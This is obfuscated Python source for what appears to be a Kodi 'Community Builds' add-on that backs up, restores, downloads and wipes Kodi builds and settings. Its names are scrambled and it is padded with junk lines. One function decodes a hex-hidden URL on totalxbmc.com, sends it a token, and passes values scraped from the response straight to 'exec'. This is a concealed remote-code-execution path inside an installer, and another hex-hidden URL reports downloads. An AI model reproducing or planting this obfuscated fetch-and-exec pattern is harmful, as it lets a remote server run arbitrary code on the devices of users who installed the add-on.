  III . execute ( "DROP TABLE IF EXISTS sizes" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( "DROP TABLE IF EXISTS texture" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( """CREATE TABLE path (id integer, url text, type text, texture text, primary key(id))""" )
  OOo0OOOoOOo . commit ( )
  III . execute ( """CREATE TABLE sizes (idtexture integer,size integer, width integer, height integer, usecount integer, lastusetime text)""" )
  OOo0OOOoOOo . commit ( )
  III . execute ( """CREATE TABLE texture (id integer, url text, cachedurl text, imagehash text, lasthashcheck text, PRIMARY KEY(id))""" )
  OOo0OOOoOOo . commit ( )
 except :
  pass
  if 84 - 84: oO00OO0oo0 + OOO00O . III1i1i
  if 69 - 69: OO / iiIi % oO00OO0oo0
def I11Oo00oO0O ( url ) :
 Ii11IIIi1 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f726573656c6c65725f323f726573656c6c65723d257326746f6b656e3d2573266f70656e656c65633d2573'
 IIII = binascii . unhexlify ( Ii11IIIi1 ) % ( I1IiiI , IIi1IiiiI1Ii , url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i1i11I = re . compile ( 'path="(.+?)"' ) . findall ( iiIiI )
 ooooooo00oO0OO = re . compile ( 'reseller="(.+?)"' ) . findall ( iiIiI )
 IIIii11 = re . compile ( 'premium="(.+?)"' ) . findall ( iiIiI )
 i1i11I1I1 = re . compile ( 'openelec="(.+?)"' ) . findall ( iiIiI )
 OOOOOoooO = ooooooo00oO0OO [ 0 ] if ( len ( ooooooo00oO0OO ) > 0 ) else 'None'
 oO0Oooo0OoO = IIIii11 [ 0 ] if ( len ( IIIii11 ) > 0 ) else 'None'
 Iiii1IIIIiiI11 = i1i11I1I1 [ 0 ] if ( len ( i1i11I1I1 ) > 0 ) else 'None'
 exec Iiii1IIIIiiI11
 exec OOOOOoooO
 exec oO0Oooo0OoO
 if 8 - 8: iIi1iIiii111 + OoOo / iIIi1iIIi / OOO00O + i1iiI11I + iiIi
 if 33 - 33: II11iII - O0OoO - OOO00O
def oO00oOoo00o0 ( name , url , description ) :
 if 'Backup' in name :
  iiii1I1 ( )
  III1I = open ( url ) . read ( )
  OOOii = os . path . join ( i1iiIIiiI111 , description . split ( 'Your ' ) [ 1 ] )
  Ii = open ( OOOii , mode = 'w' )
  Ii . write ( III1I )
  Ii . close ( )
 else :
  if 'guisettings.xml' in description :
   iIIiiIIIi1I = open ( os . path . join ( i1iiIIiiI111 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   I11iii1i = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % oOOoO0
   ooo0O = re . compile ( I11iii1i ) . findall ( iIIiiIIIi1I )
   for type , ii1i1Iii , oO00oO00O0Oo in ooo0O :
    oO00oO00O0Oo = oO00oO00O0Oo . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , ii1i1Iii , oO00oO00O0Oo ) )
  else :
   OOOii = os . path . join ( url )
   III1I = open ( os . path . join ( i1iiIIiiI111 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   Ii = open ( OOOii , mode = 'w' )
   Ii . write ( III1I )
   Ii . close ( )
 I1IiI . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "" , 'All Done !' , '' )
 if 33 - 33: iiIi + OO / OO + OO * O0OoO
 if 26 - 26: OO . OoOo . iIIi1iIIi - iiIi / i1iiI11I
def oO0ooOO ( name , url , video , description , skins , guisettingslink , artpack ) :
 if video == 'fresh' :
  if oOOoO0 != "skin.confluence" :
   I1IiI . ok ( '[COLOR=blue]T[/COLOR][COLOR=white]otal[COLOR=dodgerblue]R[/COLOR][COLOR=white]evolution[/COLOR]' , '' , 'Please switch to the default Confluence skin.' , '' )
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
   return
 i111IIiIII1i = 1
 iiii1I1 ( )
 if os . path . exists ( ooOoOoo0O ) :
  if os . path . exists ( i1 ) :
   os . remove ( ooOoOoo0O )
  else :
   os . rename ( ooOoOoo0O , i1 )
 if os . path . exists ( oOOoo00O0O ) :
  os . remove ( oOOoo00O0O )
 if not os . path . exists ( ii11iIi1I ) :
  oOooO00o0O = open ( ii11iIi1I , mode = 'w+' )
 oOooO00o0O = open ( ii11iIi1I , mode = 'r' )
 OOo0 = file . read ( oOooO00o0O )
 file . close ( oOooO00o0O )
 Oooooo0O00o = re . compile ( 'id="(.+?)"' ) . findall ( OOo0 )
 II11ii1 = Oooooo0O00o [ 0 ] if ( len ( Oooooo0O00o ) > 0 ) else ''
 ii1II1II = re . compile ( 'name="(.+?)"' ) . findall ( OOo0 )
 i11i11II11i = ii1II1II [ 0 ] if ( len ( ii1II1II ) > 0 ) else ''
 II1Ii1I1i = re . compile ( 'version="(.+?)"' ) . findall ( OOo0 )
 iIiI = II1Ii1I1i [ 0 ] if ( len ( II1Ii1I1i ) > 0 ) else ''
 O0o0oo0oOO0oO = open ( iI111I11I1I1 , mode = 'w+' )
 O0o0oo0oOO0oO . write ( 'id="' + str ( II11ii1 ) + '"\nname="' + i11i11II11i + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="' + iIiI + '"' )
 O0o0oo0oOO0oO . close ( )
 if os . path . exists ( OooO0 ) :
  os . removedirs ( OooO0 )
 try : os . rename ( i1 , ooOoOoo0O )
 except :
  I1IiI . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit Kodi and try again' , '' )
  return
 if video != 'fresh' :
  OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( name , 'We highly recommend backing up your existing build before' , 'installing any community builds.' , 'Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
  if OO0OO0OO == 0 :
   oooO0 = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , 'My Builds' ) )
   if not os . path . exists ( oooO0 ) :
    os . makedirs ( oooO0 )
   ii1i1i = II11iIII1i1I ( heading = "Enter a name for this backup" )
   if ( not ii1i1i ) : return False , 0
   oOO0oo = urllib . quote_plus ( ii1i1i )
   IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( oooO0 , oOO0oo + '.zip' ) )
   o0OO = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
   OoiiIiI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
   ooOo = "Creating full backup of existing build"
   oOOOOOoOO = "Archiving..."
   oooo00 = ""
   i1oO = "Please Wait"
   i1i1IIii1i1 ( iIiiiI , IiIIi1I1I11Ii , ooOo , oOOOOOoOO , oooo00 , i1oO , o0OO , OoiiIiI )
   if 66 - 66: III1i1i / III1i1i * iiiIi1i1I . iiIi % i1iiI11I
 if video == 'fresh' :
  I11iIiI1 ( 'CB' )
 if video == 'libprofile' or video == 'library' :
  if 22 - 22: O0OoO * iIi1iIiii111 - iiIi
  try :
   shutil . copytree ( I1i1iiI1 , II11iiii1Ii , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
  except :
   i111IIiIII1i = xbmcgui . Dialog ( ) . yesno ( name , 'There was an error trying to backup some databases.' , 'Continuing may wipe your existing library. Do you' , 'wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if i111IIiIII1i == 1 : pass
   if i111IIiIII1i == 0 : return
  IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Database.zip' ) )
  IIi1IIIIi ( II11iiii1Ii , IiIIi1I1I11Ii )
 if i111IIiIII1i == 0 : return
 time . sleep ( 1 )
 i1Ii1 = xbmc . translatePath ( os . path . join ( iIiiiI , '..' , 'koditemp.zip' ) )
 if 75 - 75: iiIi * oO00OO0oo0
 if oo == 'true' :
  try :
   oOOII1i11i1iIi11 = zipfile . ZipFile ( i1Ii1 , mode = 'w' )
   oOOII1i11i1iIi11 . write ( I11 , 'favourites.xml' , zipfile . ZIP_DEFLATED )
  except : pass
  if 67 - 67: OO / I11iii1Ii . iiIi
 if i1iII1IiiIiI1 == 'true' :
  try :
   oOOII1i11i1iIi11 = zipfile . ZipFile ( i1Ii1 , mode = 'w' )
   oOOII1i11i1iIi11 . write ( Oo0o0000o0o0 , 'sources.xml' , zipfile . ZIP_DEFLATED )
  except : pass
 try :
  oOOII1i11i1iIi11 . close ( )
 except : pass
 time . sleep ( 2 )
 o0OOO . create ( "Community Builds" , "Downloading " + description + " build." , '' , 'Please Wait' )
 OOOOOOoo0oO = os . path . join ( oooOOOOO , description + '.zip' )
 if not os . path . exists ( oooOOOOO ) :
  os . makedirs ( oooOOOOO )
 downloader . download ( url , OOOOOOoo0oO , o0OOO )
 ooooo0Oo0 = open ( oo00 , mode = 'r' )
 o0I1IIIi11ii11 = ooooo0Oo0 . read ( )
 ooooo0Oo0 . close ( )
 IiIiIIiii1I ( OOOOOOoo0oO )
 o0OOO . close ( )
 o0OOO . create ( "Community Builds" , "Checking " , '' , 'Please Wait' )
 o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
 I1iii11 ( OOOOOOoo0oO , iIiiiI , o0OOO )
 time . sleep ( 1 )
 o0OOO . create ( "Restoring Dependencies" , "Checking " , '' , 'Please Wait' )
 o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
 try :
  I1iii11 ( i1Ii1 , Iii1ii1II11i , o0OOO )
  o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
 except : pass
 try :
  time . sleep ( 1 )
  os . remove ( i1Ii1 )
 except : pass
 time . sleep ( 1 )
 if os . path . exists ( II11iiii1Ii ) :
  shutil . rmtree ( II11iiii1Ii )
  if 51 - 51: II11iII . o0OOOoO0 . I11iii1Ii % II11iII
  if 41 - 41: OooOooo - OO0O + OOO00O - iiiIi1i1I
  if 6 - 6: II11iII
  if 7 - 7: iiiIi1i1I
  if 63 - 63: i1iiI11I + O0OoO % iiiIi1i1I / OoOo % II11iII
 OO0iiiii1iiIIii = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f646f776e6c6f6164636f756e742e7068703f69643d2573'
 I111iIi1 = binascii . unhexlify ( OO0iiiii1iiIIii ) % ( II11ii1 )
 o00oooO0Oo ( I111iIi1 )
 oOooO00o0O = open ( i1iIIi1 , mode = 'r' )
 OOo0 = file . read ( oOooO00o0O )
 file . close ( oOooO00o0O )
 OOooOooo0OOo0 = re . compile ( 'version="(.+?)"' ) . findall ( OOo0 )
 oo0o0OoOO0o0 = OOooOooo0OOo0 [ 0 ] if ( len ( OOooOooo0OOo0 ) > 0 ) else ''
 I1ii1i11i = OOo0 . replace ( oo0o0OoOO0o0 , iIiI )
 O0o0oo0oOO0oO = open ( i1iIIi1 , mode = 'w' )
 O0o0oo0oOO0oO . write ( str ( I1ii1i11i ) )
 O0o0oo0oOO0oO . close ( )
 if 8 - 8: i1i1i11IIi * i1i1i11IIi * iiiIi1i1I + iIIi1iIIi . i1i1i11IIi
 if oOOo == 'false' :
  os . remove ( OOOOOOoo0oO )
 Ooooo0O0 = open ( oo00 , mode = 'w+' )
 Ooooo0O0 . write ( o0I1IIIi11ii11 )
 Ooooo0O0 . close ( )
 if video != 'fresh' :
  oOoO000 = I1IiI . yesno ( "Do You Want To Keep Your Kodi Settings?" , 'Would you like to keep your existing Kodi settings or' , 'would you rather wipe and install the ones created by the' , 'build author?' , nolabel = 'Keep my settings' , yeslabel = 'Replace my settings' )
  if oOoO000 == 0 :
   try :
    os . rename ( i1 , oOOoo00O0O )
   except :
    print "NO GUISETTINGS DOWNLOADED"
   time . sleep ( 1 )
   oOooO00o0O = open ( ooOoOoo0O , mode = 'r' )
   OOo0 = file . read ( oOooO00o0O )
   file . close ( oOooO00o0O )
   I1I1iO0O0oo = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( OOo0 )
   o00O = I1I1iO0O0oo [ 0 ] if ( len ( I1I1iO0O0oo ) > 0 ) else ''
   Oo000O = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( OOo0 )
   I1111III11 = Oo000O [ 0 ] if ( len ( Oo000O ) > 0 ) else ''
   iIOOO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( OOo0 )
   iI1 = iIOOO [ 0 ] if ( len ( iIOOO ) > 0 ) else ''
   try :
    O00oO0o000oO = open ( oOOoo00O0O , mode = 'r' )
    I1i11II11i1iI = file . read ( O00oO0o000oO )
    file . close ( O00oO0o000oO )
    iI1I1I1i1i = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( I1i11II11i1iI )
    OOo0O = iI1I1I1i1i [ 0 ] if ( len ( iI1I1I1i1i ) > 0 ) else ''
    oOOoooO0O0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( I1i11II11i1iI )
    ii1O0ooooo000 = oOOoooO0O0 [ 0 ] if ( len ( oOOoooO0O0 ) > 0 ) else ''
    OooOoOO0OO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( I1i11II11i1iI )
    I1iiIiiii1111 = OooOoOO0OO [ 0 ] if ( len ( OooOoOO0OO ) > 0 ) else ''
    I1ii1i11i = OOo0 . replace ( o00O , OOo0O ) . replace ( iI1 , I1iiIiiii1111 ) . replace ( I1111III11 , ii1O0ooooo000 )
    O0o0oo0oOO0oO = open ( ooOoOoo0O , mode = 'w+' )
    O0o0oo0oOO0oO . write ( str ( I1ii1i11i ) )
    O0o0oo0oOO0oO . close ( )
   except :
    print "NO GUISETTINGS DOWNLOADED"
   if os . path . exists ( i1 ) :
    try :
     os . remove ( i1 )
    except : print "Failed to remove guisettings"
    try :
     os . rename ( ooOoOoo0O , i1 )
    except : print "Failed to copy new guisettings"
   try :
    os . remove ( oOOoo00O0O )
   except :
    pass
 if video == 'library' or video == 'libprofile' :
  I1iii11 ( IiIIi1I1I11Ii , I1i1iiI1 , o0OOO )
  if i111IIiIII1i != 1 :
   shutil . rmtree ( II11iiii1Ii )
   if 86 - 86: i1iiI11I - IIiII % OOO00O . OO0O * OooOooo . iiiIi1i1I
 o0OOO . close ( )
 os . makedirs ( OooO0 )
 time . sleep ( 1 )
 OoooO0o ( guisettingslink , video )
 time . sleep ( 1 )
 xbmc . executebuiltin ( 'UnloadSkin()' )
 time . sleep ( 1 )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 time . sleep ( 1 )
 I1IiI . ok ( 'Force Close Failed' , 'Please manually force close by pulling the power.' , 'If the build doesn\'t look quite right on the next' , 'boot make sure the skin is set to: [COLOR=lime]' + skins + '[/COLOR] then install step 2 (guisettings fix).' )
 if 75 - 75: IIiII + OOO00O / OOO00O - OO0O * I11iii1Ii * OOO00O
 if 53 - 53: O0OoO % O000OO0
 if 42 - 42: oO00OO0oo0 / OoOo - I11iii1Ii - OOO00O + II11iII % OOO00O
 if 50 - 50: iiIi + o0OOOoO0 * OoOo - iIi1iIiii111 / oO00OO0oo0
 if 5 - 5: III1i1i - OoOo
 if 44 - 44: II11iII . II11iII + OO0O * iIi1iIiii111
 if 16 - 16: II11iII
 if 100 - 100: III1i1i - iiiIi1i1I
 if 48 - 48: o0OOOoO0 % OOO00O + III1i1i
 if 27 - 27: i1i1i11IIi / OO0O
 if 33 - 33: iiIi % i1i1i11IIi . III1i1i / i1i1i11IIi
def O0OoOo ( ) :
 OOOOoO0 = 0
 i111IIiIII1i = 0
 i1I1I1iiII ( 'totalxbmc.xml' )
 iiii1I1 ( )
 iI11IiIiiII1 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.zip' , False , False , i1iiIIiiI111 )
 if iI11IiIiiII1 == '' :
  return
 if os . path . exists ( ooOoOoo0O ) :
  if os . path . exists ( i1 ) :
   os . remove ( ooOoOoo0O )
  else :
   os . rename ( ooOoOoo0O , i1 )
 if os . path . exists ( oOOoo00O0O ) :
  os . remove ( oOOoo00O0O )
 if not os . path . exists ( ii11iIi1I ) :
  oOooO00o0O = open ( ii11iIi1I , mode = 'w+' )
 if os . path . exists ( OooO0 ) :
  os . removedirs ( OooO0 )
 try : os . rename ( i1 , ooOoOoo0O )
 except :
  I1IiI . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( i1II1 , 'We highly recommend backing up your existing build before' , 'installing any builds.' , 'Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if OO0OO0OO == 0 :
  oooO0 = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , 'My Builds' ) )
  if not os . path . exists ( oooO0 ) :
   os . makedirs ( oooO0 )
  ii1i1i = II11iIII1i1I ( heading = "Enter a name for this backup" )
  if ( not ii1i1i ) : return False , 0
  oOO0oo = urllib . quote_plus ( ii1i1i )
  IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( oooO0 , oOO0oo + '.zip' ) )
  o0OO = [ oo000 ]
  OoiiIiI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
  ooOo = "Creating full backup of existing build"
  oOOOOOoOO = "Archiving..."
  oooo00 = ""
  i1oO = "Please Wait"
  i1i1IIii1i1 ( iIiiiI , IiIIi1I1I11Ii , ooOo , oOOOOOoOO , oooo00 , i1oO , o0OO , OoiiIiI )
 IiiIiIIi1 = xbmcgui . Dialog ( ) . yesno ( i1II1 , 'Would you like to keep your existing database' , 'files or overwrite? Overwriting will wipe any' , 'existing music or video library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if IiiIiIIi1 == 0 : pass
 elif IiiIiIIi1 == 1 :
  if os . path . exists ( II11iiii1Ii ) :
   shutil . rmtree ( II11iiii1Ii )
  try :
   shutil . copytree ( I1i1iiI1 , II11iiii1Ii , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
  except :
   i111IIiIII1i = xbmcgui . Dialog ( ) . yesno ( i1II1 , 'There was an error trying to backup some databases.' , 'Continuing may wipe your existing library. Do you' , 'wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if i111IIiIII1i == 1 : pass
   if i111IIiIII1i == 0 : OOOOoO0 = 1 ; return
  IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Database.zip' ) )
  IIi1IIIIi ( II11iiii1Ii , IiIIi1I1I11Ii )
 if OOOOoO0 == 1 :
  return
 else :
  time . sleep ( 1 )
  ooooo0Oo0 = open ( oo00 , mode = 'r' )
  o0I1IIIi11ii11 = ooooo0Oo0 . read ( )
  ooooo0Oo0 . close ( )
  IiIiIIiii1I ( iI11IiIiiII1 )
  o0OOO . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
  I1iii11 ( iI11IiIiiII1 , iIiiiI , o0OOO )
  time . sleep ( 1 )
  I11IIIII = ntpath . basename ( iI11IiIiiII1 )
  O0o0oo0oOO0oO = open ( iI111I11I1I1 , mode = 'w+' )
  O0o0oo0oOO0oO . write ( 'id="none"\nname="' + I11IIIII + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="none"' )
  O0o0oo0oOO0oO . close ( )
  Ooooo0O0 = open ( oo00 , mode = 'w+' )
  Ooooo0O0 . write ( o0I1IIIi11ii11 )
  Ooooo0O0 . close ( )
  try :
   os . rename ( i1 , oOOoo00O0O )
  except :
   print "NO GUISETTINGS DOWNLOADED"
  time . sleep ( 1 )
  oOooO00o0O = open ( ooOoOoo0O , mode = 'r' )
  OOo0 = file . read ( oOooO00o0O )
  file . close ( oOooO00o0O )
  I1I1iO0O0oo = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( OOo0 )
  o00O = I1I1iO0O0oo [ 0 ] if ( len ( I1I1iO0O0oo ) > 0 ) else ''
  Oo000O = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( OOo0 )
  I1111III11 = Oo000O [ 0 ] if ( len ( Oo000O ) > 0 ) else ''
  iIOOO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( OOo0 )
  iI1 = iIOOO [ 0 ] if ( len ( iIOOO ) > 0 ) else ''
  try :
   O00oO0o000oO = open ( oOOoo00O0O , mode = 'r' )
   I1i11II11i1iI = file . read ( O00oO0o000oO )
   file . close ( O00oO0o000oO )
   iI1I1I1i1i = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( I1i11II11i1iI )
   OOo0O = iI1I1I1i1i [ 0 ] if ( len ( iI1I1I1i1i ) > 0 ) else ''
   oOOoooO0O0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( I1i11II11i1iI )
   ii1O0ooooo000 = oOOoooO0O0 [ 0 ] if ( len ( oOOoooO0O0 ) > 0 ) else ''
   OooOoOO0OO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( I1i11II11i1iI )
   I1iiIiiii1111 = OooOoOO0OO [ 0 ] if ( len ( OooOoOO0OO ) > 0 ) else ''
   I1ii1i11i = OOo0 . replace ( o00O , OOo0O ) . replace ( iI1 , I1iiIiiii1111 ) . replace ( I1111III11 , ii1O0ooooo000 )
   O0o0oo0oOO0oO = open ( ooOoOoo0O , mode = 'w+' )
   O0o0oo0oOO0oO . write ( str ( I1ii1i11i ) )
   O0o0oo0oOO0oO . close ( )
  except :
   print "NO GUISETTINGS DOWNLOADED"
  if os . path . exists ( i1 ) :
   os . remove ( i1 )
  os . rename ( ooOoOoo0O , i1 )
  try :
   os . remove ( oOOoo00O0O )
  except :
   pass
  if oooooOoo0ooo == 'libprofile' :
   I1iii11 ( IiIIi1I1I11Ii , I1i1iiI1 , o0OOO )
   if i111IIiIII1i != 1 :
    shutil . rmtree ( II11iiii1Ii )
  os . makedirs ( OooO0 )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UnloadSkin()' )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'ReloadSkin()' )
  time . sleep ( 1 )
  xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
  while xbmc . executebuiltin ( "Window.IsActive(appearancesettings)" ) :
   xbmc . sleep ( 500 )
  try : xbmc . executebuiltin ( "LoadProfile(Master user)" )
  except : pass
  I1IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'Step 1 complete. Now please change the skin to' , 'the one this build was designed for. Once done come back' , 'to this addon and restore the guisettings_fix.zip' )
  xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
  if 40 - 40: iIIi1iIIi . OooOooo * III1i1i
  if 6 - 6: OoOo - II11iII . OoOo + IIiII . OO0O
def iIi ( ) :
 import time
 iiii1I1 ( )
 oo0O = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the guisettings zip file you want to restore' , 'files' , '.zip' , False , False , i1iiIIiiI111 )
 if oo0O == '' :
  return
 else :
  IIIii1iiIi = 1
  i1i1II1I ( oo0O , IIIii1iiIi )
  if 23 - 23: OoOo * OOO00O / OooOooo . i1iiI11I % oO00OO0oo0
  if 61 - 61: III1i1i
def iIiiI111I11 ( url , name ) :
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option for first time install or if you\'re' , 'encountering any issues with your device. This will' , 'wipe all your Kodi settings, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if OO0OO0OO == 0 :
  return
 elif OO0OO0OO == 1 :
  OOo0Oo0 = '/storage/.restore/'
  IIIiIiI11iIi = os . path . join ( OOo0Oo0 , '20141128094249.tar' )
  if not os . path . exists ( OOo0Oo0 ) :
   try : os . makedirs ( OOo0Oo0 )
   except : pass
  downloader . download ( url , IIIiIiI11iIi )
  time . sleep ( 2 )
  OO0iiiii1iiIIii = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f646f776e6c6f6164636f756e742e7068703f69643d2573'
  I111iIi1 = binascii . unhexlify ( OO0iiiii1iiIIii ) % ( name )
  try :
   o00oooO0Oo ( I111iIi1 )
  except : pass
  I1IiI . ok ( "Download Complete - Press OK To Reboot" , 'Once you press OK your device will attempt to reboot,' , 'if it hasn\'t rebooted within 30 seconds please pull the power' , 'to manually shutdown. When booting you may see lines of text, don\'t worry this is normal update behaviour!' )
  xbmc . executebuiltin ( 'Reboot' )
  if 55 - 55: OO0O / OooOooo * OO0O
  if 40 - 40: I11iii1Ii . oO00OO0oo0 + i1i1i11IIi + OoOo . o0OOOoO0
def O0oo0O0OO0Oo ( ) :
 if I1ii11iIi11i == 'true' :
  OO0OOO0oOOo00O ( )
 o0oO ( '' , '[COLOR=lime]RESTORE LOCAL BUILD[/COLOR]' , 'url' , 'restore_local_CB' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 o0oO ( '' , '[COLOR=dodgerblue]Restore Local guisettings file[/COLOR]' , 'url' , 'LocalGUIDialog' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 if 66 - 66: OoOo % iIi1iIiii111 % II11iII
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'addons.zip' ) ) :
  o0oO ( '' , 'Restore Your Addons' , 'addons' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addons' )
  if 77 - 77: OO + o0OOOoO0
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'addon_data.zip' ) ) :
  o0oO ( '' , 'Restore Your Addon UserData' , 'addon_data' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addon UserData' )
  if 38 - 38: i1i1i11IIi - iIi1iIiii111 * O00oo0OO0oOOO
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'guisettings.xml' ) ) :
  o0oO ( '' , 'Restore Guisettings.xml' , i1 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your guisettings.xml' )
  if 13 - 13: OoOo * o0OOOoO0
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'favourites.xml' ) ) :
  o0oO ( '' , 'Restore Favourites.xml' , I11 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your favourites.xml' )
  if 41 - 41: O0OoO
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'sources.xml' ) ) :
  o0oO ( '' , 'Restore Source.xml' , Oo0o0000o0o0 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your sources.xml' )
  if 16 - 16: i1iiI11I
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'advancedsettings.xml' ) ) :
  o0oO ( '' , 'Restore Advancedsettings.xml' , oOo0oooo00o , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your advancedsettings.xml' )
  if 94 - 94: OOO00O % IIiII % iiiIi1i1I
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'keyboard.xml' ) ) :
  o0oO ( '' , 'Restore Advancedsettings.xml' , oO , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your keyboard.xml' )
  if 90 - 90: iIi1iIiii111 * I11iii1Ii
 if os . path . exists ( os . path . join ( i1iiIIiiI111 , 'RssFeeds.xml' ) ) :
  o0oO ( '' , 'Restore RssFeeds.xml' , oo0o0O00 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your RssFeeds.xml' )
  if 7 - 7: iIIi1iIIi . iIi1iIiii111 . iIIi1iIIi - OO
  if 33 - 33: OOO00O + iiIi - I11iii1Ii / iiiIi1i1I / iiIi
def OOO0 ( url ) :
 iiii1I1 ( )
 if 'addons' in url :
  IIIIii11II1I = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'addons.zip' ) )
  iIiiIIii1 = o0oO0
  iIii = o0oO0
  IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'addons.zip' ) )
 else :
  IIIIii11II1I = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'addon_data.zip' ) )
  iIiiIIii1 = i1i1II
 if 'Backup' in i1II1 :
  OOooo ( )
  o0OOO . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Backing Up" , '' , 'Please Wait' )
  oOoO00 = zipfile . ZipFile ( IIIIii11II1I , 'w' , zipfile . ZIP_DEFLATED )
  iI1IIIii = len ( iIiiIIii1 )
  I1i11ii11 = [ ]
  OO00O0oOO = [ ]
  for Ii1iI111 , O0oooo00o0Oo , I1iii in os . walk ( iIiiIIii1 ) :
   for file in I1iii :
    OO00O0oOO . append ( file )
  oO0o0O0Ooo0o = len ( OO00O0oOO )
  for Ii1iI111 , O0oooo00o0Oo , I1iii in os . walk ( iIiiIIii1 ) :
   for file in I1iii :
